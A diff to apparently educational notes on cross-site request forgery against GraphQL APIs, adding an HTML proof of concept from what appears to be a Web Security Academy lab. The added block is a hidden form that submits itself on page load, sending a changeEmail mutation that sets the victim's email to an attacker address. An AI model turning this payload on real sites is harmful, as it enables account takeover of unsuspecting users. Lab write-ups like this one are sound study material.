@@ -55,5 +55,18 @@ POST requests that use a content type of `application/json` are secure against f
 
 However, alternative methods such as GET, or any request that has a content type of `x-www-form-urlencoded`, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API.
 
+```html
+<html>
+  <body>
+    <form id="csrfForm" action="https://0ab4005c03ce773980ee1ce500280052.web-security-academy.net/graphql/v1" method="POST">
+      <input type="hidden" name="query" value='mutation changeEmail { changeEmail(input: { email: "attacker1@example.com" }) { email } }'>
+    </form>
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
+```
+
 
 
